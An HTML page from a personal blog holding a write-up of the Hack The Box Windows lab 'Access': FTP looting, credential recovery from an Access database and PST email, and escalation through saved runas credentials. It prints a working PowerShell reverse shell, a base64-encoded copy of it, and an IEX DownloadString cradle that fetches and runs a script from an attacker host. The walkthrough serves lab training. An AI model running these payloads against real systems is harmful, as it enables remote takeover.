@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Access | whoami</title>
+<meta name="keywords" content="">
+<meta name="description" content="Easy Windows">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/writeups/access-easy-windows/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.cd9298b33628769aa1bc1acebbbfd7aa11ce81dfe03484d479e1907760249a1d.css" integrity="sha256-zZKYszYodpqhvBrOu7/XqhHOgd/gNITUeeGQd2Akmh0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/access-easy-windows/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="http://localhost:1313/writeups/access-easy-windows/">
+  <meta property="og:site_name" content="whoami">
+  <meta property="og:title" content="Access">
+  <meta property="og:description" content="Easy Windows">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Access">
+  <meta name="twitter:description" content="Easy Windows">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Write-Ups",
+      "item": "http://localhost:1313/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Access",
+      "item": "http://localhost:1313/writeups/access-easy-windows/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Access",
+  "name": "Access",
+  "description": "Easy Windows",
+  "keywords": [
+    
+  ],
+  "articleBody": "nmap scan.\nnmap -p- -vv -T4 -Pn --min-rate=1000 -sC The website is just a static page.\nSearching for LON-MC6 immediately surfaces MS09-042 - a Telnet vulnerability that could allow RCE. Port 23 is open with telnet:\ntelnet 10.129.241.188 A “Welcome to Microsoft Telnet Service” message appears and a login is required.\nLet’s look at port 21, FTP - anonymous login is valid. There are a couple of files on the FTP server: backup.mdb (an MS Access database) which wasn’t downloading properly, and Access Control.zip which is encrypted.\nBack to the telnet vulnerability idea… I peeked at the walkthrough - downloading the files over FTP was correct; I just had to switch to binary mode to download them properly.\nCreate CSVs of every table:\nauth_group:\nWe can see administrator is an Administrator-level account. Looking at auth_user:\nadmin : admin engineer : access4u@security backup_admin : admin Those credentials didn’t work with telnet - but maybe they work for FTP or to decrypt the zip. The engineer password opened the zip:\n7z x Access\\ Control.zip That gives Access Control.pst - a Microsoft Outlook Personal Storage file.\nsudo apt install pst-utils to be able to read it on Linux. Reading the email:\nsecurity : 4Cc3ssC0ntr0ller\nTried it on telnet:\nuser.txt = ab2ab8f61dd197103a7a84665b4b04ff\nI didn’t know what I was doing with privesc at this point, so I paused and went to watch/read some privesc material.\nRunning cmdkey /list:\nMore info from the HackTricks Windows privesc page: Windows Vault stores credentials that Windows can log in the user automatically, meaning any Windows application that needs credentials to access a resource (server or website) can use Credential Manager \u0026 Windows Vault instead of the user entering username/password every time.\npowershell -NoProfile -NonInteractive -Command \"$client = New-Object System.Net.Sockets.TCPClient('10.10.16.196',4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (iex $data 2\u003e\u00261 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '\u003e '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush() }; $client.Close()\" runas opens a new window, so it can’t just run cmd.exe for us.\n# Enumerate through all *.lnk files (shortcut files) on the system and examine them for the runas command Get-ChildItem \"C:\\\" *.lnk -Recurse -Force | ft fullname | Out-File shortcuts.txt # shortcuts.txt has paths to all .lnk files, now we look for runas in the file ForEach($file in gc .\\shortcuts.txt) { Write-Output $file; gc $file | Select-String runas } It shows ZKTeco\\ZKAccess3.5\\Access.exe is being run with saved creds using runas.\nrunas /user:ACCESS\\Administrator /savecred \"powershell -NoProfile -NonInteractive -EncodedCommand IiRjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoJzEwLjEwLjE2LjE5NicsMTIzNCk7ICRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpOyBbYnl0ZVtdXSRieXRlcyA9IDAuLjY1NTM1fCV7MH07IHdoaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCkgeyAkZGF0YSA9IChOZXctT2JqZWN0IFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwkaSk7ICRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcpOyAkc2VuZGJhY2syID0gJHNlbmRiYWNrICsgJ1BTICcgKyAocHdkKS5QYXRoICsgJz4gJzsgJHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyAkc3RyZWFtLldyaXRlKCRzZW5kYnl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpOyAkc3RyZWFtLkZsdXNoKCkgfTsgJGNsaWVudC5DbG9zZSgpIgo=\" That wasn’t working, so I went through the walkthrough. Put the payload into a file admin.ps1 and serve it:\nUse:\nrunas /user:ACCESS\\Administrator /savecred \"powershell -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.196/admin.ps1')\" runas /user:ACCESS\\Administrator /savecred: runs a command as another user (Administrator) using saved credentials - if the credentials were previously entered and saved, it won’t prompt again. powershell -c IEX (...): executes a PowerShell command that downloads and runs a remote script (admin.ps1) from your attacking machine. IEX (Invoke-Expression): executes the string returned by DownloadString, which is your reverse shell payload. Admin shell.\n",
+  "wordCount" : "513",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/writeups/access-easy-windows/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "whoami",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="header-nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="whoami (Alt + H)">whoami</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" class="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="17" height="17" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu" class="menu">
+            <li>
+                <a href="http://localhost:1313/posts/" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/projects/" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/htb/" title="HTB">
+                    <span>HTB</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Access
+    </h1>
+    <div class="post-description">
+      Easy Windows
+    </div>
+  </header> 
+  <div class="post-content md-content"><p>nmap scan.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -p- -vv -T4 -Pn --min-rate<span class="o">=</span><span class="m">1000</span> -sC
+</span></span></code></pre></div><p><img alt="Access (Easy Windows).png" loading="lazy" src="/writeups/access-easy-windows/Access%20%28Easy%20Windows%29.png"></p>
+<p>The website is just a static page.</p>
+<p><img alt="Access (Easy Windows)-1.png" loading="lazy" src="/writeups/access-easy-windows/Access%20%28Easy%20Windows%29-1.png"></p>
+<p>Searching for <code>LON-MC6</code> immediately surfaces MS09-042 - a Telnet vulnerability that could allow RCE. Port 23 is open with telnet:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">telnet 10.129.241.188
+</span></span></code></pre></div><p>A &ldquo;Welcome to Microsoft Telnet Service&rdquo; message appears and a login is required.</p>
+<p>Let&rsquo;s look at port 21, FTP - anonymous login is valid. There are a couple of files on the FTP server: <code>backup.mdb</code> (an MS Access database) which wasn&rsquo;t downloading properly, and <code>Access Control.zip</code> which is encrypted.</p>
+<p>Back to the telnet vulnerability idea&hellip; I peeked at the walkthrough - downloading the files over FTP was correct; I just had to switch to <strong>binary mode</strong> to download them properly.</p>
+<p><img alt="Access (Easy Windows)-2.png" loading="lazy" src="/writeups/access-easy-windows/Access%20%28Easy%20Windows%29-2.png"></p>
+<p>Create CSVs of every table:</p>
+<p><img alt="Access (Easy Windows)-3.png" loading="lazy" src="/writeups/access-easy-windows/Access%20%28Easy%20Windows%29-3.png"></p>
+<p><code>auth_group</code>:</p>
+<p><img alt="Access (Easy Windows)-4.png" loading="lazy" src="/writeups/access-easy-windows/Access%20%28Easy%20Windows%29-4.png"></p>
+<p>We can see <code>administrator</code> is an Administrator-level account. Looking at <code>auth_user</code>:</p>
+<p><img alt="Access (Easy Windows)-5.png" loading="lazy" src="/writeups/access-easy-windows/Access%20%28Easy%20Windows%29-5.png"></p>
+<ul>
+<li><code>admin</code> : <code>admin</code></li>
+<li><code>engineer</code> : <code>access4u@security</code></li>
+<li><code>backup_admin</code> : <code>admin</code></li>
+</ul>
+<p><img alt="Access (Easy Windows)-6.png" loading="lazy" src="/writeups/access-easy-windows/Access%20%28Easy%20Windows%29-6.png"></p>
+<p>Those credentials didn&rsquo;t work with telnet - but maybe they work for FTP or to decrypt the zip. The engineer password opened the zip:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">7z x Access<span class="se">\ </span>Control.zip
+</span></span></code></pre></div><p>That gives <code>Access Control.pst</code> - a Microsoft Outlook Personal Storage file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt install pst-utils
+</span></span></code></pre></div><p>to be able to read it on Linux. Reading the email:</p>
+<p><img alt="Access (Easy Windows)-7.png" loading="lazy" src="/writeups/access-easy-windows/Access%20%28Easy%20Windows%29-7.png"></p>
+<p><code>security</code> : <code>4Cc3ssC0ntr0ller</code></p>
+<p>Tried it on telnet:</p>
+<p><img alt="Access (Easy Windows)-8.png" loading="lazy" src="/writeups/access-easy-windows/Access%20%28Easy%20Windows%29-8.png"></p>
+<p>user.txt = <code>ab2ab8f61dd197103a7a84665b4b04ff</code></p>
+<p>I didn&rsquo;t know what I was doing with privesc at this point, so I paused and went to watch/read some privesc material.</p>
+<p><img alt="Access (Easy Windows)-9.png" loading="lazy" src="/writeups/access-easy-windows/Access%20%28Easy%20Windows%29-9.png"></p>
+<p>Running <code>cmdkey /list</code>:</p>
+<p><img alt="Access (Easy Windows)-10.png" loading="lazy" src="/writeups/access-easy-windows/Access%20%28Easy%20Windows%29-10.png"></p>
+<p>More info from the HackTricks Windows privesc page: Windows Vault stores credentials that Windows can log in the user automatically, meaning any Windows application that needs credentials to access a resource (server or website) can use Credential Manager &amp; Windows Vault instead of the user entering username/password every time.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span> <span class="n">-NoProfile</span> <span class="n">-NonInteractive</span> <span class="n">-Command</span> <span class="s2">&#34;</span><span class="nv">$client</span><span class="s2"> = New-Object System.Net.Sockets.TCPClient(&#39;10.10.16.196&#39;,4444); </span><span class="nv">$stream</span><span class="s2"> = </span><span class="nv">$client</span><span class="s2">.GetStream(); [byte[]]</span><span class="nv">$bytes</span><span class="s2"> = 0..65535|%{0}; while((</span><span class="nv">$i</span><span class="s2"> = </span><span class="nv">$stream</span><span class="s2">.Read(</span><span class="nv">$bytes</span><span class="s2">, 0, </span><span class="nv">$bytes</span><span class="s2">.Length)) -ne 0) { </span><span class="nv">$data</span><span class="s2"> = (New-Object System.Text.ASCIIEncoding).GetString(</span><span class="nv">$bytes</span><span class="s2">,0,</span><span class="nv">$i</span><span class="s2">); </span><span class="nv">$sendback</span><span class="s2"> = (iex </span><span class="nv">$data</span><span class="s2"> 2&gt;&amp;1 | Out-String); </span><span class="nv">$sendback2</span><span class="s2"> = </span><span class="nv">$sendback</span><span class="s2"> + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;; </span><span class="nv">$sendbyte</span><span class="s2"> = ([text.encoding]::ASCII).GetBytes(</span><span class="nv">$sendback2</span><span class="s2">); </span><span class="nv">$stream</span><span class="s2">.Write(</span><span class="nv">$sendbyte</span><span class="s2">,0,</span><span class="nv">$sendbyte</span><span class="s2">.Length); </span><span class="nv">$stream</span><span class="s2">.Flush() }; </span><span class="nv">$client</span><span class="s2">.Close()&#34;</span>
+</span></span></code></pre></div><p><img alt="Access (Easy Windows)-11.png" loading="lazy" src="/writeups/access-easy-windows/Access%20%28Easy%20Windows%29-11.png"></p>
+<p><code>runas</code> opens a new window, so it can&rsquo;t just run cmd.exe for us.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c"># Enumerate through all *.lnk files (shortcut files) on the system and examine them for the runas command</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Get-ChildItem</span> <span class="s2">&#34;C:\&#34;</span> <span class="p">*.</span><span class="n">lnk</span> <span class="n">-Recurse</span> <span class="n">-Force</span> <span class="p">|</span> <span class="nb">ft </span><span class="n">fullname</span> <span class="p">|</span> <span class="nb">Out-File</span> <span class="n">shortcuts</span><span class="p">.</span><span class="py">txt</span>
+</span></span><span class="line"><span class="cl"><span class="c"># shortcuts.txt has paths to all .lnk files, now we look for runas in the file</span>
+</span></span><span class="line"><span class="cl"><span class="k">ForEach</span><span class="p">(</span><span class="nv">$file</span> <span class="k">in</span> <span class="nb">gc </span><span class="p">.\</span><span class="n">shortcuts</span><span class="p">.</span><span class="n">txt</span><span class="p">)</span> <span class="p">{</span> <span class="nb">Write-Output</span> <span class="nv">$file</span><span class="p">;</span> <span class="nb">gc </span><span class="nv">$file</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="n">runas</span> <span class="p">}</span>
+</span></span></code></pre></div><p><img alt="Access (Easy Windows)-12.png" loading="lazy" src="/writeups/access-easy-windows/Access%20%28Easy%20Windows%29-12.png"></p>
+<p>It shows <code>ZKTeco\ZKAccess3.5\Access.exe</code> is being run with saved creds using <code>runas</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">runas</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">ACCESS</span><span class="p">\</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">savecred</span> <span class="s2">&#34;powershell -NoProfile -NonInteractive -EncodedCommand IiRjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoJzEwLjEwLjE2LjE5NicsMTIzNCk7ICRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpOyBbYnl0ZVtdXSRieXRlcyA9IDAuLjY1NTM1fCV7MH07IHdoaWxlKCgkaSA9ICRzdHJlYW0uUmVhZCgkYnl0ZXMsIDAsICRieXRlcy5MZW5ndGgpKSAtbmUgMCkgeyAkZGF0YSA9IChOZXctT2JqZWN0IFN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmcpLkdldFN0cmluZygkYnl0ZXMsMCwkaSk7ICRzZW5kYmFjayA9IChpZXggJGRhdGEgMj4mMSB8IE91dC1TdHJpbmcpOyAkc2VuZGJhY2syID0gJHNlbmRiYWNrICsgJ1BTICcgKyAocHdkKS5QYXRoICsgJz4gJzsgJHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyAkc3RyZWFtLldyaXRlKCRzZW5kYnl0ZSwwLCRzZW5kYnl0ZS5MZW5ndGgpOyAkc3RyZWFtLkZsdXNoKCkgfTsgJGNsaWVudC5DbG9zZSgpIgo=&#34;</span>
+</span></span></code></pre></div><p>That wasn&rsquo;t working, so I went through the walkthrough. Put the payload into a file <code>admin.ps1</code> and serve it:</p>
+<p><img alt="Access (Easy Windows)-15.png" loading="lazy" src="/writeups/access-easy-windows/Access%20%28Easy%20Windows%29-15.png"></p>
+<p><img alt="Access (Easy Windows)-13.png" loading="lazy" src="/writeups/access-easy-windows/Access%20%28Easy%20Windows%29-13.png"></p>
+<p>Use:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">runas</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">ACCESS</span><span class="p">\</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">savecred</span> <span class="s2">&#34;powershell -c IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.16.196/admin.ps1&#39;)&#34;</span>
+</span></span></code></pre></div><ul>
+<li><code>runas /user:ACCESS\Administrator /savecred</code>: runs a command as another user (Administrator) using saved credentials - if the credentials were previously entered and saved, it won&rsquo;t prompt again.</li>
+<li><code>powershell -c IEX (...)</code>: executes a PowerShell command that downloads and runs a remote script (<code>admin.ps1</code>) from your attacking machine.</li>
+<li><code>IEX</code> (Invoke-Expression): executes the string returned by <code>DownloadString</code>, which is your reverse shell payload.</li>
+</ul>
+<p><img alt="Access (Easy Windows)-14.png" loading="lazy" src="/writeups/access-easy-windows/Access%20%28Easy%20Windows%29-14.png"></p>
+<p>Admin shell.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">whoami</a></span> · 
+
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
